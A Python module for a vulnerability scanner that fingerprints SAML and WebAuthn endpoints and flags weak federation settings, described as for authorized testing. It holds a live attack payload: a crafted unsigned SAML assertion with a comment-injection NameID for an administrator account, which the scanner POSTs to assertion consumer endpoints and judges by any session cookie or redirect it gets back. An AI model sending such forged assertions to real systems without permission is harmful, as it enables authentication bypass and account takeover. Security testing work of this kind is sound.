#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — SAML + WebAuthn Federation Surface

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Fingerprints federation surface (SAML SP endpoints, WebAuthn RP config)
and flags configurations that ENABLE well-known attack classes without
demonstrating them:

  * SAML XSW (XML Signature Wrapping) — endpoint accepts unsigned or
    weakly-referenced assertions.
  * SAML signature-stripping — endpoint accepts assertion without a
    Signature element at all.
  * SAML comment injection (CVE-2018-0489-class) — SP normalizes
    ``<NameID>admin<!---->x</NameID>`` to ``admin``.
  * WebAuthn RP-ID misconfiguration — origin allowed for an rpId that
    doesn't match its parent domain, opening cross-subdomain relay.
  * Fallback-MFA downgrade — WebAuthn endpoint offers a password /
    OTP fallback that isn't gated behind step-up auth.

Non-invasive: every probe is a metadata GET or an unsigned-assertion
POST. We NEVER assert a real user identity — we look for the SP's
willingness to accept malformed input, which is the primary XSW/strip
signal. Confirmed exploitation belongs in an authenticated flow.
"""
from __future__ import annotations

import json
import re
from urllib.parse import urljoin, urlparse

from modules.base import BaseModule


_SAML_METADATA_HINTS = (
    "/saml/metadata", "/saml2/metadata", "/sso/saml/metadata",
    "/simplesaml/module.php/saml/sp/metadata.php",
    "/auth/realms/", "/adfs/ls/idpinitiatedsignon.aspx",
    "/wp-content/plugins/miniorange-saml-20-single-sign-on/",
    "/.well-known/saml-configuration",
)

_SAML_ACS_HINTS = (
    "/saml/acs", "/saml2/acs", "/sso/saml/acs",
    "/simplesaml/module.php/saml/sp/saml2-acs.php",
    "/Shibboleth.sso/SAML2/POST", "/adfs/ls/",
)

_WEBAUTHN_HINTS = (
    "/webauthn", "/api/webauthn",
    "/.well-known/webauthn", "/fido2",
    "/api/auth/passkey", "/api/passkey",
)


_XSW_ASSERTION = (
    '<?xml version="1.0"?>'
    '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
    'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    'ID="atomic-xsw-probe" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
    '<saml:Issuer>atomic-xsw-probe</saml:Issuer>'
    '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
    '<saml:Assertion ID="a1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
    '<saml:Issuer>atomic-xsw-probe</saml:Issuer>'
    '<saml:Subject><saml:NameID>administrator<!---->@example.com</saml:NameID></saml:Subject>'
    '</saml:Assertion>'
    '</samlp:Response>'
)


def _b64(s: str) -> str:
    import base64
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


class SAMLWebAuthnModule(BaseModule):
    """SAML SP + WebAuthn RP surface fingerprint + weak-config detection."""

    name = "SAML / WebAuthn Federation"
    vuln_type = "saml_webauthn"

    def test(self, url, method, param, value):
        pass  # host-level module

    def test_url(self, url: str):
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return
        base = f"{parsed.scheme}://{parsed.netloc}"
        self._probe_saml_metadata(base)
        self._probe_saml_acs_unsigned(base)
        self._probe_webauthn_config(base)

    # ------------------------------------------------------------------

    def _probe_saml_metadata(self, base: str):
        for path in _SAML_METADATA_HINTS:
            try:
                resp = self.requester.request(base + path, "GET", timeout=5)
            except Exception:
                continue
            if resp is None or resp.status_code != 200:
                continue
            body = resp.text or ""
            if "EntityDescriptor" not in body and "IDPSSODescriptor" not in body and "SPSSODescriptor" not in body:
                continue
            self._emit(
                base + path,
                "SAML Metadata Exposed",
                "LOW",
                0.9,
                "SAML metadata public — leaks EntityID, ACS URLs, signing cert. Follow-up: XSW/strip probes on ACS endpoints below.",
            )

            # Look for signing cert; missing WantAssertionsSigned / RequestedAuthnContext
            # patterns are useful hints for downstream tests.
            if 'WantAssertionsSigned="true"' not in body:
                self._emit(
                    base + path,
                    "SAML SP Does Not Require Signed Assertions",
                    "HIGH",
                    0.75,
                    "SPSSODescriptor lacks WantAssertionsSigned=\"true\" — SP MAY accept unsigned assertions (SAML strip / XSW surface).",
                )

    def _probe_saml_acs_unsigned(self, base: str):
        """POST an unsigned XSW-shaped assertion to any ACS. A 2xx that
        redirects to an authenticated area or sets a session cookie is
        evidence the SP consumed our assertion — real exploitation
        belongs in an authenticated engagement flow. We only report the
        SIGNAL here (accepted-shape response) at MEDIUM confidence."""
        for path in _SAML_ACS_HINTS:
            acs_url = base + path
            payload = _b64(_XSW_ASSERTION)
            try:
                resp = self.requester.request(
                    acs_url, "POST",
                    data={"SAMLResponse": payload, "RelayState": "/"},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            except Exception:
                continue
            if resp is None:
                continue
            # A 302 to a protected area OR a Set-Cookie with a session
            # name is a strong signal (still not confirmation of full
            # takeover — that needs a valid IdP-signed assertion on the
            # engagement's real user).
            set_cookie = resp.headers.get("Set-Cookie", "") or ""
            loc = resp.headers.get("Location", "") or ""
            session_named = bool(
                re.search(r"(session|sid|jsessionid|phpsessid|auth|sso)=", set_cookie, re.IGNORECASE)
            )
            redirects_authed = bool(loc and not any(x in loc.lower() for x in ("error", "login", "denied")))
            if resp.status_code in (200, 302) and (session_named or redirects_authed):
                self._emit(
                    acs_url,
                    "SAML ACS Accepts Unsigned/XSW-shaped Assertion (signal)",
                    "HIGH",
                    0.7,
                    (
                        f"ACS returned {resp.status_code} with "
                        f"{'session cookie' if session_named else 'redirect to non-error page'} "
                        f"after unsigned XSW-shaped assertion. Confirmation requires an "
                        f"engagement IdP + real assertion — surface enables XSW/strip attacks."
                    ),
                )

    def _probe_webauthn_config(self, base: str):
        for path in _WEBAUTHN_HINTS:
            try:
                resp = self.requester.request(base + path, "GET", timeout=5)
            except Exception:
                continue
            if resp is None or resp.status_code != 200:
                continue
            body = resp.text or ""
            try:
                doc = json.loads(body)
            except Exception:
                doc = None
            if not isinstance(doc, dict):
                continue
            rp = doc.get("rp") or doc.get("relyingParty") or {}
            rp_id = str(rp.get("id") or rp.get("rpId") or "")
            origins = doc.get("origins") or doc.get("allowedOrigins") or []
            host = urlparse(base).hostname or ""

            # RP-ID scope mismatch: rpId is an ancestor domain of host,
            # allowing sibling subdomains to relay assertions to us.
            if rp_id and host and host.endswith("." + rp_id):
                self._emit(
                    base + path,
                    "WebAuthn RP-ID scoped to parent domain",
                    "MEDIUM",
                    0.85,
                    (
                        f"rpId={rp_id!r} is an ancestor of {host!r} — any subdomain "
                        f"under {rp_id} can register/authenticate credentials that "
                        f"work here (cross-subdomain relay surface)."
                    ),
                )
            # Fallback-MFA downgrade: a passkey config that advertises a
            # password fallback without step-up.
            fallback_flag = any(
                k in body.lower() for k in
                ("password_fallback", '"allowpassword":true', "allow_password_fallback")
            )
            if fallback_flag:
                self._emit(
                    base + path,
                    "WebAuthn Fallback-MFA Downgrade Path",
                    "MEDIUM",
                    0.8,
                    "Passkey config advertises password fallback — attacker who phishes password bypasses hardware key.",
                )

    def _emit(self, url, technique, severity, confidence, evidence):
        from core.engine import Finding
        self.engine.add_finding(Finding(
            technique=technique,
            url=url,
            severity=severity,
            confidence=confidence,
            param="",
            payload="",
            evidence=evidence,
        ))
